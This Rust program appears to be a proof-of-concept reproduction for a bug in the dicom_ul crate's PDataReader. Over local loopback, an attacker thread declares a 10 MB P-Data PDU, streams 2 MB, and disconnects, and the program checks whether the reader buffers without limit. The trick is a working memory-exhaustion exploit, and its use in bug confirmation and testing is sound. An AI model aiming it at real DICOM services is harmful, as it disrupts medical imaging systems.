// Real, two-real-participant, real-loopback-TCP reproduction (per CONFIRMATION.md section 11).
//
// The "victim" is a real `dicom_ul::association::PDataReader` (the crate's own real, public
// P-Data receiving type) wrapping a real `TcpStream`. The "attacker" is a genuinely separate
// thread, communicating with the victim *only* through a real TCP socket: it writes a real
// P-Data-TF header declaring a huge (10,000,000-byte) `pdu_length`, then trickles 2,000,000 real
// bytes over the real connection before disconnecting - never completing the declared PDU. No
// PDU bytes are handed to the reader in-process; everything crosses a genuine socket boundary.
use bytes::BytesMut;
use dicom_ul::association::PDataReader;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::thread;

fn main() {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();

    let attacker = thread::spawn(move || {
        let mut stream = TcpStream::connect(addr).unwrap();
        let mut header = vec![0x04u8, 0x00];
        header.extend_from_slice(&10_000_000u32.to_be_bytes());
        stream.write_all(&header).unwrap();

        let mut remaining = 2_000_000usize;
        let chunk = vec![0x41u8; 4096];
        while remaining > 0 {
            let n = chunk.len().min(remaining);
            if stream.write_all(&chunk[..n]).is_err() {
                break;
            }
            remaining -= n;
        }
        // real TCP disconnect happens here (stream dropped)
    });

    let (socket, _) = listener.accept().unwrap();
    let mut read_buffer = BytesMut::new();
    let mut reader = PDataReader::new(socket, 1018, &mut read_buffer);

    let mut out = vec![0u8; 4096];
    println!("reading from a real socket fed by a real, independent attacker thread...");
    match Read::read(&mut reader, &mut out) {
        Ok(n) => println!("unexpectedly read {n} bytes"),
        Err(e) => {
            let msg = e.to_string();
            println!("got an error: {msg}");
            if msg.contains("Connection closed by peer") {
                eprintln!(
                    "BUG: buffered the attacker's entire stream (unbounded growth) before \
                     finally failing with a generic disconnect error, instead of rejecting the \
                     oversized PDU declaration early"
                );
                attacker.join().unwrap();
                std::process::exit(1);
            } else {
                println!(
                    "correctly rejected the oversized PDU early, without buffering the \
                     attacker's entire stream"
                );
            }
        }
    }
    attacker.join().unwrap();
}
